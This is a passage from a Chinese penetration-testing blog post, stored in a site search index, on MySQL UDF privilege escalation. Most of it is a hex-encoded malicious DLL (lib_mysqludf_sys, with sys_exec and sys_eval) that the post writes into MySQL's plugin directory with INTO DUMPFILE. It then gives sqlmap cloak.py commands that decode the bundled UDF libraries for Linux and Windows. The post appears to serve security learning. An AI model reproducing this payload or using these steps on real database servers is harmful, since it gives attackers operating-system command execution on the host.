b8ed57565fd03b5ee40003937b703b67115a039614168012376c7d270a8227fea0246420575062b30d661327002f527f8df61ad2061153f76a037543b067bb614f34032168742e2c0d2c3cec257feb1b71ec5a09706a7c6faae05051597c64825d900eadf62ffa8a19066b8f91b6c72ae490c396ec1640e134a9ff3b246abb41c1f17926547dbc550c0d381e33bc05bc595d382281ec2832f7869f365f212043211c895e2118891d05f78ec243143c21a2aa210c668c186c5ffbda3806252c0620080605dd2dcdd20425002d7ffc9c8f7ab6b1f6143095562407042831d6fedb7f0807348b85e0fca0aa701ddbb5b395011c1920241318092b18476a565f201cb360c32c9f7b8985d8320a04dc03b557e01b243468dedfd1f7d8d360ce2879d40a2c833d208dbdc3da00f923685b1b300bdfaf67f534c97f23401ec25f6a4849918f144a50152e9df458aaf8a29c10f3eb67611c7e052c37d4598feded8321b9273551e0f5ee3bdc0abf03e4507f4b8417185bdb7e600bce1cdc142cd6e288b154b609e01b14f413160a4bdb313ddcdbffdc84676cc859d94e1e07f7d81bf076bbb7c00359485d1656b8bc18be04a3638b6f2af83bc673080753025073d85f60835a3bfe72f15f5e25206c6053c820cc006f35b4dd452bb84d5a346627040b85bf2b5e6e413c03c1813850e45fefa5ecfffb33d2b90b011c48180f94c28bc25dc33fb702bf35e34831c80fb74114ae057106c1a55b6c33578c081817761bffff2ff1d7487bf972098b580803d93bfb720a4283c0283bd67270ca36b5e86ae55dc38f6afef0cd71f7a970040b056418005083ec080db7c670082f316c33c576f0852f06df64a31a89b90968555db7f081f0b2091c6b04f555972dd12c937d1350195c083b04e1c26f2724c1e81ff715e0018fefb6532b034f230059948be55dc3621ddb49a301ca3dafc0fae99525242631ccff29343232b61058054c50ac2cb41e97af12b60d56096b27d7616b20cfb0fbef2ae4e03160031f73d9665b9a6c038d2be0fafc046ba039f13cb4fc8a0d6c120c7d0dc395c3c1619c965154147fe41f3e783124f020140bdac40e5643b25d53ec1068f885626df4f888c9bf4ee640bb25eea0398466820d85c33149db9f0a359a04eb605675f869639fc1f6448b7598751f1033f0071476e6ca20189d271cb4f6ee6fedf4330c113bf77507be4f59eb0b85f30a7b047ea10ac1e0100bf0ce00f7d6076c840d1e045e5f01c33f5c05646464646064686c1405766474b000003ff4c20e034b0f20185f4e6f20ffffb7ff617267756d656e7473096c6c6f77656420287564663a206c69625f6dccfd6df77973716c0d5f73085f696e666f293918dfb6ff8f2076657273696f6e20302e01341f45787065f6dbdbdd637447657861076c79201a65207374723f5bdb5afb672074791b75726171217258c00e602b7477911fd86f030b3f8672206e616d48dbb1b71f436f756c246e6f74c4636113203058b76d186d2779af72f1483fda4d943f2003121071051bf29d5860214707d0604d0d0b0f81cb074ed961dd9703ab17cc2708a77527ecc00fd81f0a3b034fc0a07b851f03240328c1556583a200c5889251ca22d877bdb119bf44ff000f5565a3aa00a8aa9251645455c95532aaaafff61d455c0410020157616974466f00fc06c07253886c654f626a07c07f6b99145669727475616c417603e0f6370d536574456e76126f6ec000bc6dbf5661726961622b4118437265f76deb6e94546806640d47264375727222cd12f65b502a636573734914266e03e083135469636bde6e6bb1f6b6fd5175657279500366846d616e371667ef1b00fd0144697367374cfdb7eded6962727879436192731a4973446562756767edee6dad266a686546a4556e6840b1b7b7b7643164457846707469af46696c4a6d295b6119b41254de64aeb0176d0dd8114990b9edd61a0a6b409d6d70876547c25a73cd517f77555122b4ed6e591b5c537973186deec3c2eb2e39417373650975697cdb15da434c7d5f687e396d5f2edffedebe5f616d7367087869740b646a753a5f666469ec4217b076260a639a5f64fd6cadb91f5f686f6f6b131459725ff802700148d15fdb9ceb0249730a330a6c21d6f0bd82539c2a64d46e640893050b130f651e6b5b7bc25f2c723456ed6d1c182ff6d69a700a035f706f522947e1ddbe6e106468756c5eb92a6bcb92bd9b1b2ca806e0b6d86e6ec57265250866112e827bdb5673749c637079082439edcd5c6b32c06e4d0fd7ed1f5ac36f7319663a1f5f4370705831c75e3b8474bc6d343f001817ffffffff3d193c1c1b161e55142d16270815270f11115f10130a070d2e17090705160c1e7ffbffff080a0b160918181505061b050c10060717062105110f061421110b08e4fbdfb62b22052a111d0d18532d483806000776fbdbe5080c09330a090b0c051007061612eedffeed0e0b34150b18160d3d0542c205121e14066930ffd8ddff110c0e1d4d0517230d0c3224080b4506f0de041004f03b0a6eff2c01043808041c1c0204003e4c016dff21fd05004afe9f5a8fe00002210b0109080c634f7ad60c1213d616a300200e10c10a01630b02ab3362b7ee6107006003040233351eeed9c0ce34100706c02633d6eddb7620ac22033c144002b0021c5759dd0050520143c8c8ba65b1214200a7b82f06db5d182eb4787407ea0b900c5bfa90cdb742602e72647d610861c90e76c508fb0a00c700a1db66bb77402e26300304301becdb943d001a27c04f73726300eb11c0061b40731c4f78c2c2a365761f01030002ed7760497b27421ba023030000edd8d152127c53030400000000000080ff00000000000000000000807c2408010f85b901000060be007000108dbe00a0ffff5783cdffeb0d9090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b92a0000008a07472ce83c0177f7803f0075f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe005000008b0709c0743c8b5f048d8430b472000001f35083c708ff96f0720000958a074708c074dc89f95748f2ae55ff96f472000009c07407890383c304ebe16131c0c20c0083c7048d5efc31c08a074709c074223cef771101c38b0386c4c1c01086c401f08903ebe2240fc1e010668b0783c702ebe28baef87200008dbe00f0ffffbb0010000050546a045357ffd58d871702000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e9ad98ffffc80000056020000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d226173496e766f6b6572222075694163636573733d2266616c7365223e3c2f726571756573746564457865637574696f6e4c6576656c3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564339302e435254222076657273696f6e3d22392e302e32313032322e38222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010830000f08200000000000000000000000000001d83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004b45524e454c33322e444c4c004d5356435239302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000006672656500000000000000004afe9f5a0000000058840000010000001200000012000000a4830000ec8300003484000021100000a312000000100000a4120000a3120000a0120000cc110000a31200009811000086110000a31200009811000076100000a3120000431000002e1100001a110000a91000006d84000083840000a0840000bb840000c7840000da840000eb840000f484000004850000128500001b8500002b8500003985000041850000508500005d850000658500007485000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000700000100000006d3c683e6c3e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 INTO DUMPFILE &#x27;D:<span class="hljs-symbol">\\</span>env<span class="hljs-symbol">\\</span>php<span class="hljs-symbol">\\</span>phpstudy_pro<span class="hljs-symbol">\\</span>Extensions<span class="hljs-symbol">\\</span>MySQL5.7.26<span class="hljs-symbol">\\</span>lib<span class="hljs-symbol">\\</span>plugin<span class="hljs-symbol">\\</span>udf.dll&#x27;;<br></code></pre></td></tr></table></figure><p>dll和so文件</p><p>sqlmap中<code>.dll</code>和<code>.so</code>文件的路径：<code>sqlmap/data/udf/mysql</code></p><p>不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具<code>cloak.py</code>来解码使用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">└─<span class="hljs-variable">$pwd</span><br><span class="hljs-regexp">/mnt/</span>c<span class="hljs-regexp">/Penetration/</span>DatabaseTools<span class="hljs-regexp">/SQLMap/</span>extra/cloak<br><span class="hljs-comment"># 解码 32 位的 Linux 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><span class="hljs-comment"># 解码 64 位的 Linux 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><span class="hljs-comment"># 解码 32 位的 Windows 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><span class="hljs-comment"># 解码 64 位的 Windows 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure><p><strong>更多攻击方法参考</strong></p><p><a href="https://www.sqlsec.com/2020/11/mysql.html#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">https://www.sqlsec.com/2020/11/mysql.html#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
